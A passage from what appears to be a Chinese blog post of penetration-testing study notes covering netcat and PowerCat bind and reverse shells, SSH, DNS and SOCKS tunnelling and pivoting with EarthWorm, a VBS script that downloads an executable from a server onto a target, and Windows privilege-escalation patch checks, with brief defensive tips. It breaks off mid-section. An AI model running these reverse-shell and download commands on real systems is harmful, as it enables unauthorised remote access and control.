（7）简易聊天</span></span></span><br><span class="line">nc -l -p 888  # 本地 VPS 主机，监听</span><br><span class="line">nc -vn IP 888  # 目标主机</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 获取 shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （1）正向 Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 监听目标主机 4444 端口</span></span></span><br><span class="line">nc -lvp 4444 -e /bin/sh  # Linux</span><br><span class="line">nc -lvp 4444 -e C:\windows32\System32\cmd.exe  # Windows</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 本地或 VPS 主机上连接目标主机的 4444 端口</span></span></span><br><span class="line">nc IP 4444</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># （2）反向 Shell</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 本地获取 VPS 主机上监听本地 9999 端口</span></span></span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 目标主机连接 VPS 主机 9999 端口</span></span></span><br><span class="line">nc IP 9999 -e /bin/sh</span><br><span class="line">nc IP 9999 -e C:\windows\System32\cmd.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 目标主机没有 nc 时反向获取 Shell</span></span><br><span class="line">http://duitutu.cn/fuxk/shell.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 内网代理</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS 监听 3333 短裤</span></span></span><br><span class="line">nc -lvp 3333</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 目标主机</span></span></span><br><span class="line">nc -lvp 3333 -e /bin/sh</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 边界服务器</span></span></span><br><span class="line">nc -v vps-ip 3333 -c &quot;nc -v tar-ip 3333&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="nc-参数"><a href="#nc-参数" class="headerlink" title="nc 参数"></a>nc 参数</h5><ul>
+<li>-d：后台模式</li>
+<li>-e：程序重定向</li>
+<li>-g &lt;网关&gt;：设置路由器跃程通信网关，最多可设置 8 个</li>
+<li>-G &lt;指向器数目&gt;：设置源路由指向器的数量，值为 4 的倍数</li>
+<li>-h：在线帮助</li>
+<li>-i &lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</li>
+<li>-l：使用监听模式，管理和控制传入的数据</li>
+<li>-n：直接使用 IP 地址（不通过域名服务器）</li>
+<li>-o &lt;输出文件&gt;：指定文件名称，把来往传输的数据转换为十六进制字节码后保存在该文件中</li>
+<li>-p &lt;通信端口&gt;：设置本地主机使用的通信端口</li>
+<li>-r：随机指定本机与远程主机的通信端口</li>
+<li>-s &lt;源地址&gt;：设置本地主机送出数据包的 IP 地址</li>
+<li>-u：使用 UDP 传输协议</li>
+<li>-v：详细输出</li>
+<li>-w &lt;超时秒数&gt;：设置等待连线的时间</li>
+<li>-z：将输入/输出功能关闭，只在扫描通信端口时使用</li>
+</ul>
+<h4 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h4><p><a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1  <span class="comment"># 导入</span></span><br><span class="line">powercat <span class="literal">-h</span></span><br><span class="line"><span class="comment"># 1. 通过 nc 正向连接 PowerCat</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>  <span class="comment"># 目标机器监听 -l：监听模式，用于入站连接 -p：指定监听端口 -e：指定要启动进程的名称 -v：显示详情</span></span><br><span class="line">nc tar<span class="literal">-IP</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># 本地机器获得 shell</span></span><br><span class="line"><span class="comment"># 2. 通过 nc 反向连接 PowerCat</span></span><br><span class="line">nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-vv</span>  <span class="comment"># 本地机器监听并接收 shell</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br><span class="line"><span class="comment"># 3. 通过 PowerCat 返回 PowerShell</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># 本地主机监听</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>- ep  <span class="comment"># 目标主机，-eq：用于返回 PowerShell</span></span><br><span class="line"><span class="comment"># 4. 通过 PowerCat 传输文件</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># 本地主机</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-i</span> C:\test.txt <span class="literal">-v</span>  <span class="comment"># 目标主机</span></span><br><span class="line"><span class="comment">## 传输完毕后连接不会自动断开，可以在本地文件末尾追加需要的内容，-i：输入，可以写文件名，也可以直接写字符串 -of：输入文件名，可以在文件名前添加路径</span></span><br><span class="line"><span class="comment"># 5. 用 PowerCat 生成 Payload</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 本地生成，反弹 cmd</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-ep</span> <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 本地生成，反弹 powershell</span></span><br><span class="line"><span class="comment">## 上传到目标机器并执行</span></span><br><span class="line">powercat <span class="literal">-c</span> tar<span class="literal">-IP</span> <span class="literal">-p</span> <span class="number">2333</span> <span class="literal">-v</span>  <span class="comment"># 本地接收 shell</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h3><h4 id="SSH-协议"><a href="#SSH-协议" class="headerlink" title="SSH 协议"></a>SSH 协议</h4><p>创建 SSH 隧道的常用参数</p>
+<ul>
+<li>-C：压缩传输，提高传输速度</li>
+<li>-f：将 SSH 传输转入后台执行，不占用当前的 Shell</li>
+<li>-N：建立静默连接（建立了连接，但是看不到具体会话）</li>
+<li>-g：允许远程主机连接本地用于转发的端口</li>
+<li>-L：本地端口转发</li>
+<li>-R：远程端口转发</li>
+<li>-D：动态转发（SOCKS 代理）</li>
+<li>-P：指定 SSH 端口</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 本地转发</span></span><br><span class="line">ssh -CfNg -L vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 以一个外网 Web 服务器为跳板机，将内网目标机器的某个端口映射到 VPS 机器的某个端口吗，再访问 VPS 的对应端口就相当于访问内网目标机器的对应端口，在 VPS 上执行 netstat -tulnp | grep &quot;1153&quot; 来查看 vps-PORT 端口是否已经连接，然后执行如下命令，在 VPS 中访问 1153 端口</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 远程转发</span></span><br><span class="line">ssh -CfNg -R vps-PORT:tar-IP:tar-PORT root@jump-IP</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 以一个外网 Web 服务器为跳板机，将 VPS 某个端口的流量转发到内网目标机器的某个端口，然后访问 VPS 的对应端口，就可以访问内网目标机器的对应端口了，在VPS 上访问 vps-PORT 端口</span></span></span><br><span class="line">rdesktop 127.0.0.1:vps-PORT</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 动态转发</span></span><br><span class="line">ssh -CfNg -D vps-PORT root@jump-IP  # 在 VPS 上执行，建立一个动态 SOCKS4/5 代理隧道</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 然后打开浏览器设置代理，通过浏览器访问内网</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 动态端口映射就是建立一个 SSH 加密的 SOCKS4/5 代理通道，任何支持 SOCKS4/5 协议的程序都可以使用这个加密通道进行代理访问</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御 SSH 隧道攻击的思路</strong></p>
+<p>主要是因为系统访问控制措施不够</p>
+<ul>
+<li>在系统中配置 SSH 远程管理白名单</li>
+<li>在 ACL 中限制只有特定的 IP 地址才能连接 SSH</li>
+<li>设置系统完全使用带外管理</li>
+</ul>
+<p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制 SSH 远程登陆的地址和双向访问控制策略</p>
+<h4 id="HTTP-HTTPS-协议"><a href="#HTTP-HTTPS-协议" class="headerlink" title="HTTP/HTTPS 协议"></a>HTTP/HTTPS 协议</h4><p>常用工具</p>
+<ul>
+<li>reGeorg：<a target="_blank" rel="noopener" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></li>
+<li>meterpreter</li>
+<li>tunna</li>
+</ul>
+<h4 id="DNS-协议"><a href="#DNS-协议" class="headerlink" title="DNS 协议"></a>DNS 协议</h4><p><code>cat /etc/resolv.conf</code> 查询当前内部域名及 IP，<code>nslookup 内部0域名</code> 查看是否能与内部 DNS 通信， <code>nslookup baidu.com</code> 查询是否能通过内部 DNS 服务器解析外部域名，如果可以则意味着可以使用 DNS 隧道实现隐蔽通信</p>
+<h5 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h5><p><a target="_blank" rel="noopener" href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
+<h5 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h5><p><a target="_blank" rel="noopener" href="https://github.com/Al1ex/iodine">https://github.com/Al1ex/iodine</a></p>
+<p><strong>防御 DNS 隧道攻击的方法</strong></p>
+<p>防御很 J8 难，下列操作可以防御常见的隧道攻击行为</p>
+<ul>
+<li>禁止网络中的任何人向外部服务器发送 DNS 请求，只允许与受信任的 DNS 服务器通信</li>
+<li>虽然没有人会将 TXT 解析请求发送给 DNS 服务器，但是 dnscat2 和邮件服务器/网关会这样做，因此，可以将邮件服务器/网关列入白名单并阻止传入和传出流量中的 TXT 请求</li>
+<li>跟踪用户的 DNS 查询次数，如果达到阈值，就生成相应的报告</li>
+<li>组织 ICMP</li>
+</ul>
+<h3 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h3><p>常见的网络场景</p>
+<ul>
+<li>服务器在内网中，可以任意访问外部网络</li>
+<li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接</li>
+<li>服务器在内网中，对外只开放了部分端口（例如 80），且服务器不能访问外部网络</li>
+</ul>
+<h4 id="常用-SOCKS-代理工具"><a href="#常用-SOCKS-代理工具" class="headerlink" title="常用 SOCKS 代理工具"></a>常用 SOCKS 代理工具</h4><ul>
+<li>EarthWorm：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/EarthWorm">https://github.com/rootkiter/EarthWorm</a><ul>
+<li>EW 已经永久停止更新，Github 上好像也没了，EW 的新版本 Termite：<a target="_blank" rel="noopener" href="https://github.com/rootkiter/Termite">https://github.com/rootkiter/Termite</a></li>
+</ul>
+</li>
+<li>reGeorg</li>
+<li>sSocks</li>
+<li>SocksCap64：<a target="_blank" rel="noopener" href="http://www.sockscap64.com/">http://www.sockscap64.com/</a></li>
+<li>Proxifier（很好用的全局代理）：<a target="_blank" rel="noopener" href="https://www.proxifier.com/">https://www.proxifier.com/</a></li>
+<li>ProxyChains（Linux 下实现全局代理）</li>
+</ul>
+<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>EW 有六种命令格式：</p>
+<ul>
+<li>正向连接<ul>
+<li>ssokcsd</li>
+</ul>
+</li>
+<li>反向连接<ul>
+<li>rcsocks</li>
+<li>rssocks</li>
+</ul>
+</li>
+<li>复杂网络的多级级联<ul>
+<li>lcx_slave</li>
+<li>lcx_listen</li>
+<li>lcx_tran</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 正向 SOCKS5 服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 适用于目标机器拥有一个外网 IP 的情况</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 执行以下命令，即可架设一个端口为 888 的 SOCKS 代理，接下来，使用 SocksCap64 添加这个 IP 地址的代理即可</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 反弹 SOCKS5 服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 目标机器没有公网 IP 的情况（使其可以访问内网资源）</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在公网 VPS 上添加一个转接隧道，把 1080 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s rcsocks -l 1008 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 Web 服务器上启动 SOCKS5 服务，然后反弹到 VPS 的 888 端口</span></span></span><br><span class="line">ew -s rcsocks -d VPS-IP -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 二级网络环境（a）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 如果已经获得 A 主机与 B 主机权限，A 拥有两块网卡，一块通外网，一块只通 B，而 B 只可以访问内网资源</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 B 中，利用 ssocksd 方式启动 888 的 SOCKS 代理</span></span></span><br><span class="line">ew -s ssocksd -l 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 在 A 中，将 1080 端口收到的代理请求转发给 B 的 888 端口，即可通过 A 的外网 1080 端口使用 B 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s lcx_tran -l 1080 -f B-IP -g 888</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4。 二级网络环境（b）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 如果已经获得 A 主机与 B 主机权限，A 既没有公网 IP 地址，也无法访问内网资源，B 只可以访问内网资源</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 首先在公网 VPS 中添加转接隧道，将 10800 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s lcx_listen -l 10800 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B 中，利用 ssocksd 方式启动 999 端口的 SOCKS 代理</span></span></span><br><span class="line">ew -s ssocksd -l 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 中，利用 lcx_slave 方式将公网 VPS 的 888 端口和 B 主机的 999 端口连接起来，接下来就可以通过访问公网 VPS 的 10800 端口使用在 B 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. 三级网络环境</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 没有公网 IP，可以访问外网，B 不能访问外网，但可以被 A 访问，C 可被 B 访问，而且可以访问核心区域</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># VPS 中，将 1080 端口收到的代理请求转发给 888 端口</span></span></span><br><span class="line">ew -s rcsocks -l 1080 -e 888</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># A 中，将公网 VPS 的 888 端口和 B 的 999 端口连接起来</span></span></span><br><span class="line">ew -s lcx_slave -d VPS-IP -e 888 -f B-IP -g 999</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># B 中，将 999 端口收到的代理请求转发给 777 端口</span></span></span><br><span class="line">ew -s lcx_listen -l 999 -e 777</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># C 中，启动 SOCKS5 服务，并反弹到 B 的 777 端口，接下来就可以通过访问公网 VPS 的 1080 端口使用在 C 上架设的 SOCKS5 代理了</span></span></span><br><span class="line">ew -s rssocks -d B-IP -e 777</span><br></pre></td></tr></table></figure>
+
+<h3 id="上传和下载"><a href="#上传和下载" class="headerlink" title="上传和下载"></a>上传和下载</h3><p>对于不能上传 Shell，但是可以执行命令的 Windows 服务器（而且唯一的入口就是命令行环境），可以在 Shell 命令行环境中对目标服务器进行上传和下载操作</p>
+<h4 id="利用-FTP-协议上传"><a href="#利用-FTP-协议上传" class="headerlink" title="利用 FTP 协议上传"></a>利用 FTP 协议上传</h4><p>在本地或者 VPS 上搭建 FTP 服务器，常用的 FTP 命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">open &lt;服务器地址&gt;  # 连接服务器</span><br><span class="line">cd &lt;目录名&gt;  # 进入指定目录</span><br><span class="line">lcd &lt;文件夹路径&gt;  # 定位本地文件夹（上传文件的位置或者下载文件的本地位置）</span><br><span class="line">type  # 查看当前的传输方式（默认为 ASCII 码传输）</span><br><span class="line">ascii  # 设置传输方式为 ASCII 码传输（传 TXT 等格式的文件）</span><br><span class="line">binary  # 设置传输方式为二进制传输（传输 EXE 文件，以及图片、视/音频文件等）</span><br><span class="line">close  # 结束与服务器的 FTP 会话</span><br><span class="line">quit  # 结束与服务器的 FTP 会话并退出 FTP 环境</span><br><span class="line">put &lt;文件名&gt; [newname]  # 上传，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">send &lt;文件名&gt; [newname]  # 上传，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">get &lt;文件名&gt; [newname]  # 下载，newname 为保存时的新名字，若不指定将以原名保存</span><br><span class="line">mget filename [filename ...]  # 下载多个文件，mget 命令支持空格和&quot;?&quot;两个通配符，例如 &quot;mget .mp3&quot; 表示下载 FTP 服务器当前目录下所有扩展名为&quot;.mp3&quot;的文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用-VBS-上传"><a href="#利用-VBS-上传" class="headerlink" title="利用 VBS 上传"></a>利用 VBS 上传</h4><p>VBS 脚本主要使用 msxm12.xmlhttp &amp; adodb.stream 对象</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">&quot;Msxm12.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://server_ip/target.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\target.exe&quot;</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>在目标服务器的 Shell 命令行中用 &gt; 和 &gt;&gt; 逐行输入文件 download.vbs，然后执行 <code>Csript download.vbs</code> 即可在目标服务器中下载 VPS 上的 target.exe</p>
+<h4 id="利用-Debug-上传"><a href="#利用-Debug-上传" class="headerlink" title="利用 Debug 上传"></a>利用 Debug 上传</h4><p>将需要上传的 exe 文件转换为 hex 形式，再通过 echo 命令将其写入文件，最后通过 Debug 功能将 hex 代码编译并还原成 exe 文件</p>
+<p>该工具的功能列举：</p>
+<ul>
+<li>直接输入、修改、跟踪、运行汇编语言源程序</li>
+<li>查看操作系统中的内容</li>
+<li>查看 ROM BIOS 的内容</li>
+<li>查看、修改 RAM 内部的设置值</li>
+<li>以扇区或文件的方式读/写软盘数据</li>
+<li>将十六进制代码转换为可执行文件（hex）</li>
+</ul>
+<p>在 KaLi 中，exe2bat.exe 工具位于 /usr/share/windows-binaries 目录下，在该目录下执行，将需要上传的 xxx.exe 文件转换成 hex 形式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine exe2bat.exe xxx.exe xxx.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后利用目标服务器的 Debug 功能还原</p>
+<p>使用 Debug 是一种比较老的方法，exe2bat.exe 只支持小于 64K 的文件，大了的话会报错</p>
+<h4 id="利用-Nishang-bitsadmin-PowerShell-上传"><a href="#利用-Nishang-bitsadmin-PowerShell-上传" class="headerlink" title="利用 Nishang / bitsadmin / PowerShell 上传"></a>利用 Nishang / bitsadmin / PowerShell 上传</h4><ul>
+<li>Nishang 中的下载执行脚本 Downoad_Execute</li>
+<li>命令行工具 bitsadmin（Windows XP 以后的版本 Windows 自带（Windows Update 就是用它下载文件），推荐在 Windows7 和 Windows8 主机上使用）</li>
+<li>以 .NET 框架为基础的 PowerShell（在 Windows Server 2003 以后版本默认自带）</li>
+</ul>
+<h2 id="权限提升分析防御"><a href="#权限提升分析防御" class="headerlink" title="权限提升分析防御"></a>权限提升分析防御</h2><p>在 Windwos 中，权限大概分为四种，分别是 User、Administrator、System、TrustedInstaller，通常我们接触的是前三种，第四种在常规使用中通常不会涉及</p>
+<ul>
+<li>User：普通用户权限，是系统中最安全的权限（因为分配给改组的默认权限不允许成员修改操作系统的设置或者用户资料）</li>
+<li>Administrator：管理员权限，可以利用 Windows 的机制将自己提升为 System 权限，一边操作 SAM 文件等</li>
+<li>System：系统权限，可以对 SAM 等敏感文件进行读取，往往需要将 Administrator 权限提升到 System 权限才可以对散列值进行 Dump 操作</li>
+<li>TrustedInstaller：Windows 的最高权限，对系统文件，即使拥有 System 权限也无法进行修改，只有拥有 TrustedInstaller 权限的用户才可以修改系统文件</li>
+</ul>
+<p>常用提权方法：</p>
+<ul>
+<li>系统内核溢出漏洞提权</li>
+<li>数据库提权</li>
+<li>错误的系统配置提权</li>
+<li>组策略首选项提权</li>
+<li>Web 中间件漏洞填权</li>
+<li>DLL 劫持提权</li>
+<li>滥用高权限令牌提权</li>
+<li>第三方软件/服务提权</li>
+</ul>
+<h3 id="系统内核溢出漏洞提权分析"><a href="#系统内核溢出漏洞提权分析" class="headerlink" title="系统内核溢出漏洞提权分析"></a>系统内核溢出漏洞提权分析</h3><h4 id="通过手动执行命令发现缺失补丁"><a href="#通过手动执行命令发现缺失补丁" class="headerlink" title="通过手动执行命令发现缺失补丁"></a>通过手动执行命令发现缺失补丁</h4><p>查看当前权限，<code>whoami /groups</code>，我们需要从 Mandatory Label\Medium Mandatory Level 提升到 Mandatory Label\High Mandatory Level，我们可以通过 <code>systeminfo</code> 或者 <code>Wmic gfe get Caption,Description,HotFixIp,InstalledOn</code> 查询补丁</p>
+<p>攻击者一般采取的利用方式为：寻找提权的 EXP，将已安装的补丁编号与提权的 EXP 编号进行对比，例如 KiTrap0D 和 kB9796682、MS11-011 和 KB2393802、MS11-080 和 KB2592799、MS10-021 和 KB2592799，然后使用没有编号的 EXO 进行提权</p>
+<p>常见 EXP：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h4 id="利用-Metaspoit-发现缺失补丁"><a href="#利用-Metaspoit-发现缺失补丁" class="headerlink" title="利用 Metaspoit 发现缺失补丁"></a>利用 Metaspoit 发现缺失补丁</h4><p>post/windows/gather/enum_patches 模块</p>
+<h4 id="Windows-Expoit-Suggester"><a href="#Windows-Expoit-Suggester" class="headerlink" title="Windows Expoit Suggester"></a>Windows Expoit Suggester</h4><p><a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
+<p>使用 systeminfo 命令获取信息并导入 patches.txt 文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">py wes.py --update  # 自动下载安全公告数据库，下载的文件会自动在当前目录以 Excel 的形式保存</span><br><span class="line">pip install xlrd -upgrade  # 安装 xlrd 模块</span><br><span class="line">py wes.py -d 2019-02-02-mssb.xls -i patches.txt  # 预处理，检查系统中是否存在未修复的漏洞</span><br></pre></td></tr></table></figure>
+
+<p>msf 还内置了 local_expoit_suggester 模块，可以用于快速识别系统中可能被利用的漏洞</p>
+<h4 id="PowerShell-的-Sherlock-脚本"><a href="#PowerShell-的-Sherlock-脚本" class="headerlink" title="PowerShell 的 Sherlock 脚本"></a>PowerShell 的 Sherlock 脚本</h4><p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> sherlock.ps1</span><br><span class="line"><span class="built_in">Find-AllVulns</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows-操作系统配置错误利用分析"><a href="#Windows-操作系统配置错误利用分析" class="headerlink" title="Windows 操作系统配置错误利用分析"></a>Windows 操作系统配置错误利用分析</h3><h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>系统服务权限配置漏洞（可写目录漏洞）有如下两种可能</p>
+<ul>
+<li>服务未运行：攻击者会使用任意服务替换原来的服务，然后重启服务</li>
+<li>服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用 DLL 劫持技术并尝试重启服务来提权</li>
+</ul>
+<h3 id="提权这里先鸽了，属实不知道怎么写"><a href="#提权这里先鸽了，属实不知道怎么写" class="headerlink" title="提权这里先鸽了，属实不知道怎么写"></a>提权这里先鸽了，属实不知道怎么写</h3><h2 id="域内横向移动分析及防御"><a href="#域内横向移动分析及防御" class="headerlink" title="域内横向移动分析及防御"></a>域内横向移动分析及防御</h2><h3 id="常用-Windows-远程连接和相关命令"><a href="#常用-Windows-远程连接和相关命令" class="headerlink" title="常用 Windows 远程连接和相关命令"></a>常用 Windows 远程连接和相关命令</h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
